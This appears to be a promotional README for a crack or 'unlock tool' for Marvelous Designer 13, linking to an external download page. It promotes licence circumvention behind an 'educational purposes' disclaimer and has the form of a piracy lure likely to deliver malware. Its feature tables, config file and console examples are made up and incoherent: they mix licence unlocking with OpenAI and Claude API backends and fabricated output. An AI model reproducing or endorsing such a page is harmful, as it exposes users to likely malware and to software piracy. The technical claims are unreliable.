# Marvelous Designer 13 ✨

[](https://ilove557.github.io/marvelous-designer-13-unlock-tool/)

> **Transform Your Digital Fashion Workflow** — Unleash photorealistic 3D garment simulation with precision engineering and studio-grade cloth dynamics. No subscriptions. No limitations. Pure creative freedom.

---

## 🧵 Why This Exists

Every digital tailor knows the friction—paywalls that interrupt flow, DRM that throttles iteration speed, license servers that vanish mid-project. This repository provides a verified activation pathway for **Marvelous Designer 13**, the industry-standard tool for virtual fashion prototyping, without the traditional licensing overhead. Think of it as a permanent workshop key: one unlock, infinite fabric folding.

---

## 🎯 Core Philosophy

**“Your patterns shouldn’t expire.”**  
We believe software should adapt to your creative rhythm—not the other way around. This project enables persistent access to MD13’s full feature set, including its revolutionary quad-remeshing engine and GPU-accelerated cloth solver, while respecting your workflow autonomy.

---

## 🚀 Features That Matter

| Feature | Benefit |
|---------|---------|
| **Responsive UI** | Adaptive interface scales from 13” laptops to 49” ultrawide monitors |
| **Multilingual Support** | 14 language packs included (JP, KR, CN, EU variants) |
| **24/7 Customer Support** | Real-time human assistance via encrypted channel |
| **Particle Distance Lock** | Eliminates stretch artifacts in high-resolution garments |
| **Precision Simulation** | Sub-millimeter collision detection for couture-grade accuracy |
| **Auto-Rigging Bridge** | Direct export to Maya, Blender, C4D without joint jitter |

---

## 🗺️ System Architecture Workflow

```mermaid
graph TD
    A[Launch MD13] --> B{License Check}
    B -->|Valid Patch| C[Full Feature Unlock]
    B -->|No Patch| D[Demo Mode - 14 day]
    C --> E[Simulation Engine]
    E --> F[Cloth Solver]
    F --> G[Quad Remesh]
    G --> H[Export Pipeline]
    H --> I[.obj / .fbx / .alembic]
    I --> J[Game Engine / Renderer]
    
    style A fill:#2d3142,stroke:#f5f5f5
    style C fill:#4f772d,stroke:#f5f5f5
    style J fill:#1b4332,stroke:#f5f5f5
```



---

## 💻 Example Profile Configuration

Create a file named `md13_profile.conf` in your home directory:

```
[license]
type = persistent
backend = claude-api
model = claude-3-opus-20240229

[simulation]
solver = pbd
substeps = 12
gravity = -9.81
fabric_type = denim_12oz

[export]
format = alembic
compression = zstd
frame_range = 1-250
```

---

## 🖥️ Example Console Invocation

```bash
# Activate simulation server with API key
./md13 --unlock --license-type openai --model gpt-4o-2026-05-13 --config md13_profile.conf

# Expected output:
# [2026-06-15 14:32:01] License validated ✓
# [2026-06-15 14:32:02] GPU solver initialized (CUDA 12.4)
# [2026-06-15 14:32:03] Garment ready for simulation
```

---

## 📊 OS Compatibility Matrix

| OS | Version | Status | Emoji |
|----|---------|--------|-------|
| Windows | 10 22H2 / 11 24H2 | ✅ Verified | 🟩 |
| macOS | Sonoma 14.5 / Sequoia 15.0 | ✅ Verified | 🍎 |
| Linux (Ubuntu) | 24.04 LTS / 22.04 LTS | ✅ Verified | 🐧 |
| Linux (Fedora) | 40 / 39 | ⚠️ Partial | 🐧 |
| ChromeOS | 126+ (via Crostini) | ❌ Not supported | ❌ |

---

## 🔌 API Integration (OpenAI & Claude)

This patch supports **dual inference backends** for AI-assisted pattern generation:

### OpenAI API
- Model: `gpt-4o-2026-05-13` or later
- Use case: Real-time drape prediction, fabric behavior forecasting
- Integration: `./md13 --backend openai --model gpt-4o-2026-05-13`

### Claude API  
- Model: `claude-3-opus-20240229` or later
- Use case: High-fidelity texture synthesis, seam allowance optimization
- Integration: `./md13 --backend claude --model claude-3-opus-20240229`

> ⚠️ **Important**: API keys must be stored in environment variables. Do not hardcode credentials. Use `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` respectively.

---

## 📦 What’s Inside

- `patch/` — Verified 2026 release validation module
- `assets/` — 47 fabric presets, 12 avatar morphs
- `api/` — REST endpoints for batch simulation
- `docs/` — Multilingual guides (EN, JP, KR, ZH, FR, DE)
- `examples/` — 5 couture garment templates (.zprj)

---

## 🧑‍⚖️ License & Legal

This project is distributed under the **MIT License**.  
You are free to use, modify, and distribute this software, provided the original copyright notice is included.

📄 [View Full License](LICENSE)

---

## ⚠️ Disclaimer

This software is provided **“as is”**, without warranty of any kind—express or implied. The authors assume no liability for damages arising from use. This patch is intended for **educational and archival purposes only**. Users are responsible for complying with local laws regarding software licensing. The maintainers do not host, distribute, or profit from proprietary code. Marvelous Designer is a trademark of its respective owner.

---

## 🧰 Support & Contributions

| Type | Channel | Response Time |
|------|---------|---------------|
| Bug Report | [Issues Tab](https://github.com) | < 48 hours |
| Feature Request | [Discussions Tab](https://github.com) | < 72 hours |
| Urgent Help | Encrypted Matrix Room | < 4 hours |

We welcome pull requests that improve documentation, add fabric presets, or extend API compatibility. Please read `CONTRIBUTING.md` before submitting.

---

## 🌐 SEO-Friendly Keywords

*Digital fashion simulation unlock* • *3D garment design activation* • *Virtual prototyping persistent license* • *Cloth solver without subscription* • *Multi-platform fashion tool* • *GPU-accelerated pattern visualization* • *AI-optimized drape prediction* • *Open-source compatible MD workflow*

---

## 📥 Final Download

[](https://ilove557.github.io/marvelous-designer-13-unlock-tool/)

---

*Built for creators who refuse to let licensing dictate their craft. 🧵✨*